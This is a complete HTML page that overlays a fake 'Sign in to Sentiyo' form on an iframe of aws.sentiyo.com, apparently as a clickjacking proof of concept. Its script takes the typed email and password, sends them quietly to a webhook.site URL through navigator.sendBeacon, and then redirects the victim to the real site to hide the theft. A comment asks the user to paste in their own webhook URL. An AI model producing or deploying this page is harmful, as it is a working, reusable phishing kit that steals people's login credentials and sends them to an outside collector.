<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Management Console - Sign In</title>
    <style>
        /* Zero out margins to allow full-screen coverage */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        /* The legitimate Sentiyo site loads in the background */
        .target-frame { 
            border: none;
            width: 100vw; 
            height: 100vh;
            display: block;
            z-index: 1;
        }

        /* The Malicious Overlay Form: Aligns over the real login box */
        .login-overlay {
            position: absolute;
            top: 45%; 
            left: 50%;
            transform: translate(-50%, -50%);
            background: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            z-index: 100; 
            width: 350px;
            text-align: center;
        }

        .login-overlay h2 { margin-bottom: 20px; color: #333; font-size: 20px; }
        
        .login-overlay input {
            width: 90%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        .login-overlay button {
            width: 98%;
            padding: 12px;
            background-color: #0056b3; 
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>
<body>

    <div class="login-overlay">
        <h2>Sign in to Sentiyo</h2>
        <input type="text" id="fake_user" placeholder="Email or Username" required>
        <input type="password" id="fake_pass" placeholder="Password" required>
        <button onclick="captureData()">Login</button>
    </div>

    <iframe src="https://aws.sentiyo.com" class="target-frame"></iframe>

    <script>
        function captureData() {
            const email = document.getElementById('fake_user').value;
            const pass = document.getElementById('fake_pass').value;

            // PASTE YOUR UNIQUE WEBHOOK.SITE URL HERE
            const webhookURL = "https://webhook.site/000bbebf-f7bb-461d-9213-3b62a199b823";

            // Use Beacon API to send data silently in the background
            const payload = new FormData();
            payload.append('Target', 'aws.sentiyo.com');
            payload.append('Email', email);
            payload.append('Password', pass);
            payload.append('Vulnerability', 'Clickjacking / UI Redressing');

            navigator.sendBeacon(webhookURL, payload);

            // Immediate redirect to the real site to hide the attack
            window.location.href = "https://aws.sentiyo.com"; 
        }
    </script>

</body>
</html>
